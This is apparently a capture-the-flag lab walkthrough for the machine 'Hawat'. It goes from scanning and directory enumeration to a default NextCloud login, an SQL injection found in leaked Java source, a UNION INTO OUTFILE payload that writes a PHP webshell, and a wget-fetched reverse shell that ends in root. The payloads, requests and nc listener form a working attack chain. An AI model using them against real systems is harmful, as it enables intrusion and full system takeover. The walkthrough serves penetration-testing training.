----

# Exploitation Guide for Hawat

## Summary

In this walkthrough, we will discover the source code for an application. By analyzing this source code, we will discover an SQL injection vulnerability. We will use this vulnerability to get remote code execution on the machine, which will lead to a root shell.

## Enumeration

### Nmap

We'll begin with an `nmap` scan.

```
kali@kali:~$ sudo nmap -p- 192.168.120.130                                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 10:15 CST
Nmap scan report for 192.168.120.130
Host is up (0.14s latency).
Not shown: 65527 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   unknown
30455/tcp open   unknown
50080/tcp open   unknown

Nmap done: 1 IP address (1 host up) scanned in 188.29 seconds
```

```
kali@kali:~$ sudo nmap -sV -sC -p 22,17445,30455,50080 192.168.120.130
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 10:21 CST
Nmap scan report for 192.168.120.130
Host is up (0.15s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
17445/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
...
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
...
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
...
|   RTSPRequest: 
|     HTTP/1.1 400 
...
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
30455/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: W3.CSS
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
|_http-title: W3.CSS Template
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
```

We discover web services on ports 17445, 30455 and 50080.

### Web Services

#### Port 50080

Apart from the fact that this pizza contains some black olives, we don't find anything interesting on the front page.

Let's search for hidden pages.

```
kali@kali:~$ gobuster dir -u http://192.168.120.130:50080 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.120.130:50080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/09 09:32:01 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/4 (Status: 301)
/cgi-bin/ (Status: 403)
/cloud (Status: 301)
/images (Status: 301)
/~bin (Status: 403)
/~ftp (Status: 403)
/~http (Status: 403)
/~root (Status: 403)
/~nobody (Status: 403)
/~mail (Status: 403)
===============================================================
2021/03/09 09:34:03 Finished
===============================================================
```

In the directory named **cloud**, we find an installation of _NextCloud_.

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_69_image_1_8OaTfX7L.png)

Testing simple credentials (`admin`:`admin`), we manage to log in to the application. Inside, we find **IssueTracker.zip**, and after opening this archive, we discover the source code of a web application.

Let's keep exploring the other web services for now.

#### Port 30455

There is nothing of interest on the front page either, so let's search for hidden pages here as well.

```
kali@kali:~$ gobuster dir -u http://192.168.120.130:30455 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.120.130:30455
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/09 14:17:08 Starting gobuster in directory enumeration mode
===============================================================
/4                    (Status: 301) [Size: 169] [--> http://192.168.120.130:30455/4/]
/index.php            (Status: 200) [Size: 3356]
/phpinfo.php          (Status: 200) [Size: 68611]

===============================================================
2021/03/09 14:17:36 Finished
===============================================================
```

There is a **phpinfo.php** left over with the entire PHP configuration.

#### Port 17445

On this port, we find an _Issue Tracker_ application.

```
kali@kali:~$ curl http://192.168.120.130:17445/            

<!DOCTYPE html>
<html lang="en">
	<head>
    	<meta charset="UTF-8">
    	<title>Issue Tracker</title>
		<link href="/css/bootstrap.min.css" rel="stylesheet" />
	</head>
	<body>
	...
```

The source code we found on _NextCloud_ just became much more interesting.

Giving a quick look at this source code, we identify that the application was developed using _Java Spring_. Upon further inspection, we find something interesting in the file **IssueController.java**.

```java
package com.issue.tracker.issues;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.List;
import java.util.Optional;
import java.util.Properties;

import javax.persistence.EntityManager;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;

	// ...
	@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
		// 
		// Custom code, need to integrate to the JPA
		//
	    Properties connectionProps = new Properties();
	    connectionProps.put("user", "issue_user");
	    connectionProps.put("password", "ManagementInsideOld797");
        try {
			conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
		    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
		    Statement stmt = conn.createStatement();
		    stmt.executeQuery(query);

        } catch (SQLException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
        // TODO: Return the list of the issues with the correct priority
		List<Issue> issues = service.GetAll();
		model.addAttribute("issuesList", issues);
		return "issue_index";
        
	}
	// ...
}
```

This custom code doesn't follow the Java Spring conventions to access the database and contains a clear SQL injection vulnerability.

## Exploitation

### SQL Injection Vulnerability

We can now test our theory. If we navigate to `http://192.168.120.130:17445/issue/checkByPriority?priority=Normal`, we are greeted by a login page. We can easily create a user account with the _Register_ button.

With that done, we can try again. We are now greeted by the following error message.

> There was an unexpected error (type=Method Not Allowed, status=405).

That is strange, the source code indicates it should accept GET requests. This means that the source code might have been modified, but let's simply try a POST request using Burp for now.

This worked. Next, we'll try a simple SQL injection payload to verify our theory.

```
POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+sleep(5);+--+- HTTP/1.1
Host: 192.168.120.130:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=E408CE3E9BBBEC15DCAD194F380E68A9
Upgrade-Insecure-Requests: 1
```

After sending this request, we notice that the query takes five seconds to execute, which confirms the vulnerability.

The next step is to get code execution. Using the details extracted from the **phpinfo.php** file earlier, we know the web root of the PHP server where we can write a reverse shell payload.

```
$_SERVER['DOCUMENT_ROOT']	/srv/http
```

Let's test this theory. We will use the following simple webshell.

```
<?php echo exec($_GET["cmd"]);
```

The final payload will look like this.

```
priority=Normal' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php'; -- 
```

Using a tool like [URL Encoder](https://www.urlencoder.org/), we encode the string to be URL-compatible.

```
Normal%27+UNION+SELECT+%27%3C%3Fphp+echo+exec%28%24_GET%5B%22cmd%22%5D%29%3B%27+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd.php%27%3B+--+
```

Note that we have a trailing space at the end of the payload. Let's run this query with Burp.

```
POST /issue/checkByPriority?priority=Normal%27+UNION+SELECT+%27%3C%3Fphp+echo+exec%28%24_GET%5B%22cmd%22%5D%29%3B%27+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd.php%27%3B+--+ HTTP/1.1
Host: 192.168.120.130:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=E408CE3E9BBBEC15DCAD194F380E68A9
Upgrade-Insecure-Requests: 1
```

If everything goes well, we can confirm that the file was created (we'll remember that the web server that leaked the **phpinfo.php** file was on port 30455).

```
kali@kali:~$ curl "http://192.168.120.130:30455/cmd.php?cmd=id" 
...
uid=0(root) gid=0(root) groups=0(root)   
```

Perfect, we have command execution. Even better, the server is running as `root`.

Let's create a reverse shell. We'll create a copy of **/usr/share/webshells/php/php-reverse-shell.php**, edit the IP and port, and then start a web server to transfer it.

```
kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php rev.txt
kali@kali:~$ vim rev.txt
...
```

```
kali@kali:~$ sudo python3 -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
```

We'll navigate to the following URL to transfer the file.

```
kali@kali:~$ curl 'http://192.168.120.130:30455/cmd.php?cmd=wget http://192.168.118.3:443/rev.txt -O /srv/http/rev.php'
```

With the shell transferred, we can start a listener and access the file to receive the final shell.

```
kali@kali:~$ sudo nc -lvnp 443
listening on [any] 443 ...
```

```
kali@kali:~$ curl http://192.168.120.130:30455/rev.php
```

```
kali@kali:~$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.130] 56404
Linux hawat 5.10.14-arch1-1 #1 SMP PREEMPT Sun, 07 Feb 2021 22:42:17 +0000 x86_64 GNU/Linux
 00:12:32 up 15 min,  1 user,  load average: 0.09, 0.04, 0.00
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0     23:59    6:56   0.01s  0.01s -bash
uid=0(root) gid=0(root) groups=0(root)
sh: cannot set terminal process group (479): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1# 
```
